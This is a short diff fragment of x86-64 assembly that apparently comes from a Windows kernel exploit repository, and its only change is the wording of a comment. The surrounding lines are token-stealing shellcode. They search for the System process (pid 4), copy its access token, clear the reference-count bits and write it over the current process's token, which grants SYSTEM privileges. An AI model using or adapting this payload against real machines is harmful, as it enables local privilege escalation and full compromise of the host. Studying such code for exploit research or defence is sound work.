@@ -46,7 +46,7 @@ cmp rcx, 4		;; Compare to System pid.
 jnz loop
 
 mov rcx, [rbx + 0x358] 
-and cl, 0xf0		;; Null the token
+and cl, 0xf0		;; Null the token's ref_count
 mov [rax + 0x358], rcx ;; Override current process token.
 
 
